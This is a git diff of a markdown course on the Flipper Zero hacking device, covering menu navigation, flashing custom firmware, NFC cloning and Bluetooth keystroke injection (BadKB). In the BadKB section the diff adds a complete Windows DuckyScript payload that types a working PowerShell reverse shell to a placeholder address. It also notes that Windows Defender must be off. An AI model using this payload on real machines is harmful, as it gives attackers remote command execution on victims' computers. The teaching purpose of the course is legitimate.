@@ -5,6 +5,7 @@
 Welcome to the Flipper Zero Unleashed course. This class holds everything from
 an intro to intermediate level content.
 
+![](../Assets/Flipper/Main_Flipper_background.png)
 # Guide
 
 The following will be covered in this course:
@@ -24,21 +25,37 @@ users to explore and understand different aspects of cybersecurity.
 Here's a breakdown of its key features:
 
 1. **RFID/NFC Emulation:** The Flipper Zero can emulate RFID and NFC cards,
-   allowing users to interact with contactless systems and understand their
-   vulnerabilities.
+  allowing users to interact with contactless systems and understand their
+  vulnerabilities.
 2. **Bluetooth Hacking:** It has capabilities to analyze and manipulate
-   Bluetooth signals, making it a useful tool for learning about wireless
-   security protocols.
+  Bluetooth signals, making it a useful tool for learning about wireless
+  security protocols.
 3. **Infrared Control:** With infrared capabilities, the Flipper Zero can be
-   used for tasks like controlling TVs and other devices that use infrared
-   communication.
+  used for tasks like controlling TVs and other devices that use infrared
+  communication.
 4. **Tamagotchi-Like Interface:** The device has a playful tamagotchi-like
-   interface, making it more engaging for users while they learn about hacking
-   and security.
+  interface, making it more engaging for users while they learn about hacking
+  and security.
 5. **Open-Source and Customizable:** One of the notable aspects is that it's
-   open-source, meaning users can modify and customize the software to suit their
-   needs. This makes it a great tool for learning programming, cybersecurity, and
-   ethical hacking.
+  open-source, meaning users can modify and customize the software to suit their
+  needs. This makes it a great tool for learning programming, cybersecurity, and
+  ethical hacking.
+
+### Navigating the Flipper
+![Flipper Button explain](../Assets/Flipper/Fllipper_zero_Button_explained.png)
+
+The main way to navigate the Flipper with the right side of the flipper. The 
+defualt firmware and unleash menu can be very hard for newcomers and thats one 
+reason Extreme was made.
+
+  - The Navigation buttons move UP RIGHT LEFT DOWN on the menu
+  - Enter/ Select button if for selecting something in the menu.
+  - The back button is to back out of what ever menu you are on.
+ > NOTE: 
+ > - If you get lost you can just hit the back button till you get back to 
+ main art screen. 
+ > - You can learn more about the Flipper controls here [Flipper main website](https://docs.flipper.net/basics/control)
+
 
 ## Jail Breaking a Flipper Zero
 
@@ -48,25 +65,30 @@ the software that runs on embedded systems. Flashing is necessary when you want
 to install new features to extend your hacking abilities.
 
 You may be asking how do I flash firmware onto my Flipper, is it easy?
+it is, There are two way to flash the frimware
+ 
+ 1. **Web updater**
+ 2. **With QFlipper app**
 
-My answer to this yes it easy, if you use the Web Updater. Many GitHub
-repositories provide instant links to the web updater to install their firmware.
-Once you click these links all you have to do is plug in your flipper to your
-machine and click `Update`.
+>Note: 
+> - To update/Jail break a flipper you need a SD card
+> - Also Flipper can support up to 256 GB SD cards
 
 ### GitHub Repositories:
-
-> Below are the GitHub Repositories for the two most common Flipper Firmware's
+ This are the main GitHub Repositories for the two most common Flipper Firmware's
 
 * Unleashed: [DarkFlippers/unleashed-firmware (github.com)](https://github.com/DarkFlippers/unleashed-firmware)
 * Extreme: [Flipper-XFW/Xtreme-Firmware (github.com)](https://github.com/Flipper-XFW/Xtreme-Firmware)
 
-### Web Updater:
+### Web Updater process:
 
 > Below are Direct Links to the Flipper Labs Web Updater
 
-* Unleashed: [Unleashed Web Updater](https://lab.flipper.net/?url=https://unleashedflip.com/fw/unlshd-069/flipper-z-f7-update-unlshd-069.tgz&channel=release-cfw&version=unlshd-069)
+* Unleashed: [Unleashed Web Updater](https://lab.flipper.net/?url=https://unleashedflip.com/fw_extra_apps/flipper-z-f7-update-unlshd-071e.tgz&channel=release-cfw&version=unlshd-071e)
 * Extreme: [Xtreme Web Updater](https://flipper-xtre.me/update/)
+  
+![](../Assets/Flipper/X_and_unleash_webupdater.png)
+### QFlipper app update process
 
 ### Resources:
 
@@ -85,12 +107,12 @@ It has the following Capabilities:
 * **Writing** The Flipper can write to other cards/tags
 * **Emulate** The Flipper can emulate a signal it has previously read and stored
 
-  ## How to Clone Emulate NFC
+## How to Clone Emulate NFC
 
-> Disclaimer: Always be aware of the type of card or tag you are trying to hack with the
-> Flipper, this helps you understand what module you need to use to actually be
-> able to read it. For example, if you have an iClass card you don't want to be
-> using the Mifare NFC Module.
+> Disclaimer: Always be aware of the type of card or tag you are trying to hack 
+> with the Flipper, this helps you understand what module you need to use to 
+> actually be able to read it. For example, if you have an iClass card you 
+> don't want to be using the Mifare NFC Module.
 
 ## Bad Bluetooth (BadKB)
 
@@ -114,12 +136,11 @@ initial connection was established, our Flippers could then function as
 allowed us to send malicious keystrokes, ultimately granting us reverse shell
 access to the targeted machine.
 
-* **THN Article:** [New BLUFFS Bluetooth Attack Expose Devices to Adversary-in-the-Middle Attacks (thehackernews.com)](https://thehackernews.com/2023/12/new-bluffs-bluetooth-attack-expose.html)
-* **Threat Locker Blog Post:** [How Hackers Use Bluetooth to Take Over Your Mac Device | ThreatLocker](https://www.threatlocker.com/blog/mac-bluetooth-impersonation-attacks)
+* **The Hack News Article:** [New BLUFFS Bluetooth Attack Expose Devices to Adversary-in-the-Middle Attacks (thehackernews.com)](https://thehackernews.com/2023/12/new-bluffs-bluetooth-attack-expose.html)
+* **ThreatLocker Blog Post:** [How Hackers Use Bluetooth to Take Over Your Mac Device | ThreatLocker](https://www.threatlocker.com/blog/mac-bluetooth-impersonation-attacks)
 * **Reverse Shell Payloads:**
-  * macOS:[ ZTW/Payload (github.com)](macos-reverseshell-payload.txt)
-
-    ```duckyscript
+  * MacOS Payload:[ ZTW/Payload (github.com)](macos-reverseshell-payload.txt)
+    ```bat
     REM --- MACOS REVERSE SHELL ---
     DEFAULT_DELAY 14
     DELAY 1000
@@ -133,12 +154,43 @@ access to the targeted machine.
     DELAY 500
     ENTER
     ```
-
-  * Windows: [ZTW/Payloads (github.com)](windows-revershell-payload.txt)
-
-    ```duckyscript
+  * Windows Payload: [ZTW/Payloads (github.com)](windows-revershell-payload.txt)
+    ```bat
     REM --- WINDOWS REVERSE SHELL ---
+    DEFAULT_DELAY 14
+    DELAY 3000
     GUI r
+    DELAY 500
+    STRING powershell
+    DELAY 500
+    ENTER
+    DELAY 1000
+    STRING 'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<IP-HERE>',<PORT-HERE>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+    DELAY 500
+    ENTER
+    DELAY 1000
+    GUI r
+    DELAY 500
+    STRING cmd
+    ENTER
+    DELAY 1000
+    STRING curl parrot.live
+    DELAY 500
+    ENTER
     ```
 
+    > Note: Windows Defender need to be turn off for this to work
+    > , Payload is the powershell#2 from https://www.revshells.com/
 
+# Reference Links 
+* **Flipper Control page:** [Flipper Control page](https://docs.flipper.net/basics/control)
+* **Unleashed Web Updater Version unlshd0.71e:** [Unleashed Web Updater](https://lab.flipper.net/?url=https://unleashedflip.com/fw_extra_apps/flipper-z-f7-update-unlshd-071e.tgz&channel=release-cfw&version=unlshd-071e)
+* **Extreme Web Updater:** [Xtreme Web Updater](https://flipper-xtre.me/update/)
+* **Unleashed Github:** [DarkFlippers/unleashed-firmware (github.com)](https://github.com/DarkFlippers/unleashed-firmware)
+* **Extreme Github:** [Flipper-XFW/Xtreme-Firmware (github.com)](https://github.com/Flipper-XFW/Xtreme-Firmware)
+* **Ultimate Guide For New Flipper Owners:** [Talking Sasquatch : Starter Guide - YouTube](https://www.youtube.com/watch?v=12M_oHmxcCQ)
+* **The Hack News Article:** [New BLUFFS Bluetooth Attack Expose Devices to Adversary-in-the-Middle Attacks (thehackernews.com)](https://thehackernews.com/2023/12/new-bluffs-bluetooth-attack-expose.html)
+* **ThreatLocker Blog Post:** [How Hackers Use Bluetooth to Take Over Your Mac Device | ThreatLocker](https://www.threatlocker.com/blog/mac-bluetooth-impersonation-attacks)
+* **MacOS Payload:**[ ZTW/Payload (github.com)](macos-reverseshell-payload.txt)
+* **Windows Payload:** [ZTW/Payloads (github.com)](windows-revershell-payload.txt)
+* **ReveShell:** [ReveShell](https://www.revshells.com/)
